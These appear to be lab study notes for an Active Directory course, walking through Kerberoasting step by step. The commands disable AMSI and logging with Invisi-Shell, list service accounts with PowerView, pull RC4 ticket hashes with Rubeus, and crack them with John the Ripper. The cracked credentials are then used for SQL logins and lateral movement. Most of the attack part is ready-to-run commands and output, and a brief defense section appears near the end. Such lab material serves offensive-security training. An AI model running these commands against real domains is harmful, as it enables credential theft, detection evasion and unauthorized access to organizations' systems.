# Attack - Kerberoasting (Service Account Password Cracking)

**Date:** Friday, August 26, 2026
**Topic:** Kerberoasting - Extract & Crack Service Account Passwords

---

## What is Kerberoasting?

**Simple explanation:**
- Services run with user accounts (svcadmin, sqladmin, etc)
- Kerberos gives us encrypted password hashes
- No admin needed to request hashes
- We crack hashes offline with wordlists
- Result: Service account password obtained

---

## Why It Works

```
Normal security:
- Users protected by password complexity
- Admins change passwords regularly

Service accounts:
- Often have weak passwords
- Rarely changed
- Run with specific privileges
- Not monitored like user accounts
- Easy target for cracking
```

---

## Phase 1: Find Services with User Accounts

### Start Invisi-Shell

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

**What it does:**
- Disables AMSI
- Disables logging
- Operations invisible

---

### Load PowerView & Find Services

```powershell
# Load PowerView
. C:\AD\Tools\PowerView.ps1

# Find all services running with user accounts
Get-DomainUser -SPN

# Output shows:
# svcadmin → MSSQLSvc/dcorp-mgmt (SQL Server)
# sqladmin → MSSQLSvc/dcorp-mssql (SQL Server)
# (Other services with user accounts)
```

**What this finds:**
- Services running with domain user accounts
- Not machine accounts (difficult passwords)
- Good targets for cracking

---

## Phase 2: Request Kerberos Hashes

### Use Rubeus to Get Hashes

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe `
  -args kerberoast `
  /user:svcadmin `
  /simple `
  /rc4opsec `
  /outfile:C:\AD\Tools\hashes.txt
```

**Parameters:**
- `kerberoast` — Attack type
- `/user:svcadmin` — Target service account
- `/simple` — Simple output format
- `/rc4opsec` — Only RC4 hashes (easier to crack)
- `/outfile:` — Save to file

**What it does:**
1. Request service ticket for svcadmin
2. Extract encrypted hash
3. Save to hashes.txt

**Output:**
```
$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*[hash]
```

---

## Phase 3: Clean Hashes

### Remove Port Number from Hash

**Before:**
```
$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*
```

**After (remove `:1433`):**
```
$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*
```

**How to fix:**
1. Open `C:\AD\Tools\hashes.txt`
2. Find `:1433` or `:1521` or `:3389` etc
3. Delete the port number
4. Save file

---

## Phase 4: Crack Hashes with John

### Run John the Ripper

```powershell
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe `
  --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt `
  C:\AD\Tools\hashes.txt
```

**Parameters:**
- `--wordlist=` — Password list to try
- `C:\AD\Tools\hashes.txt` — Hash file

**What happens:**
1. John reads wordlist (10k passwords)
2. Tries each password
3. Cracks hash when password matches
4. Displays: `password (svcadmin)`

**Output example:**
```
Using default OpenMP thread count: 4
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 DES/3DES/MD5 32/64])
kerberoast       (svcadmin)
1 password hash cracked, 0 left
```

---

## Complete Attack Steps

### Step-by-Step

```powershell
# STEP 1: Bypass logging
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# STEP 2: Load PowerView
. C:\AD\Tools\PowerView.ps1

# STEP 3: Find services
Get-DomainUser -SPN
# → svcadmin found (SQL Server)

# STEP 4: Request hashes
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe `
  -args kerberoast /user:svcadmin /simple /rc4opsec `
  /outfile:C:\AD\Tools\hashes.txt

# STEP 5: Edit hashes.txt
# Open file, remove :1433 from hash, save

# STEP 6: Crack hashes
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe `
  --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt `
  C:\AD\Tools\hashes.txt

# RESULT: Password obtained! (kerberoast)
```

---

## What You Get

**From Kerberoasting:**
- Service account name: `svcadmin`
- Service account password: `kerberoast`
- Can now login as service account
- Access to SQL Server
- Database access
- Lateral movement

---

## Why No Admin Needed

```
Normal attack:
- Need admin to extract passwords
- Need DC access
- Risky and detectable

Kerberoasting:
- Any domain user can request tickets
- Tickets encrypted with service password
- We can crack offline
- No admin needed
- Looks normal (tickets are normal)
```

---

## Why Weak Passwords

```
Machine accounts:
- Generated randomly
- 120+ character passwords
- Impossible to crack
- Used for security

Service accounts:
- Created by admins
- Often simple passwords
- Example: kerberoast, Passw0rd!, SQL2019
- Used for convenience
- Easy to crack (10k wordlist)
```

---

## Tips for Success

```
✓ Use /rc4opsec flag
  └─ Only gets crackable hashes
  └─ Skips AES encrypted hashes

✓ Remove port from hash
  └─ :1433 must be removed
  └─ John won't crack otherwise

✓ Use good wordlist
  └─ 10k-worst-pass.txt (included)
  └─ Or use rockyou.txt (larger)

✓ Try multiple services
  └─ svcadmin (SQL)
  └─ sqladmin (SQL)
  └─ appservice (App)
  └─ Multiple password chances

✓ Check service permissions
  └─ Service account may be admin
  └─ May have database access
  └─ May have application privileges
```

---

## Common Service Accounts

| Service | Account | Port | Access |
|---|---|---|---|
| SQL Server | svcadmin | 1433 | Database |
| Exchange | exchangeadmin | 143 | Email |
| SharePoint | sharepoint_svc | 80/443 | Web |
| App Service | appsvc | Varies | Application |
| Backup | backup_svc | Varies | Backup system |

---

## Multiple Services at Once

```powershell
# Kerberoast multiple services
$users = @("svcadmin", "sqladmin", "appsvc")

foreach ($user in $users) {
  C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe `
    -args kerberoast /user:$user /simple /rc4opsec `
    /outfile:C:\AD\Tools\hashes_$user.txt
}

# Now crack each file
# More chances to crack passwords
```

---

## Troubleshooting

### Hash Cracking Too Slow?

```
Solution 1: Use GPU
└─ John supports GPU acceleration
└─ Faster than CPU only

Solution 2: Better wordlist
└─ rockyou.txt (140 million passwords)
└─ Use instead of 10k-worst-pass.txt

Solution 3: HashCat
└─ Faster than John
└─ GPU optimized
└─ Same hash format
```

### John Says "No Passwords Loaded"?

```
Check:
- Hash file format correct?
- Port number removed? (:1433 gone?)
- Hash not corrupted?
- Try with -format=krb5tgs-17
```

### Can't Find Services with SPN?

```
Reasons:
- No services running with user accounts
- All use machine accounts
- Try Get-DomainSPNUser instead
- Check different domain
```

---

## After Getting Password

```powershell
# Now you have: svcadmin : kerberoast

# Option 1: Connect to SQL Server
sqlcmd -S dcorp-mgmt -U svcadmin -P kerberoast

# Option 2: PowerShell session
$cred = New-Object PSCredential("dcorp\svcadmin", (ConvertTo-SecureString "kerberoast" -AsPlainText -Force))
Invoke-Command -ComputerName dcorp-mgmt -Credential $cred -ScriptBlock { whoami }

# Option 3: Lateral movement
# Access database server
# Access shared resources
# Access application services
```

---

## Detection & Defense

### What to Monitor

```
Detection:
- TGS requests from normal users (unusual)
- /rc4opsec flag in Rubeus (known tool)
- Large number of TGS requests (scanning)
- Hash output files

Defense:
- Use strong passwords for services
- Use managed service accounts (MSA)
- Use machine accounts when possible
- Monitor TGS requests
- Audit service accounts
- Set AES encryption (not RC4)
```

---

## Key Takeaway

```
KERBEROASTING:
1. Find services with user accounts
2. Request Kerberos hashes
3. Clean hashes (remove ports)
4. Crack with John the Ripper
5. Get service account password
6. Access service resources

Why it works:
- Service passwords often weak
- Kerberos hashes requested by normal users
- No admin needed
- Offline cracking
- High success rate (10k wordlist)

Time to crack:
- 10k wordlist: Seconds to minutes
- 140M wordlist: Minutes to hours
- GPU acceleration: Very fast

Risk level:
- Very low
- No admin needed
- Looks normal
- Difficult to detect
- High success chance
```

---

## References

- [Rubeus Kerberoasting](https://github.com/GhostPack/Rubeus)
- [John the Ripper](https://www.openwall.com/john/)
- [Kerberoasting Explanation](https://www.harmj0y.net/blog/redteaming/kerberoasting/)

---

*Next: Database Exploitation via Service Account*
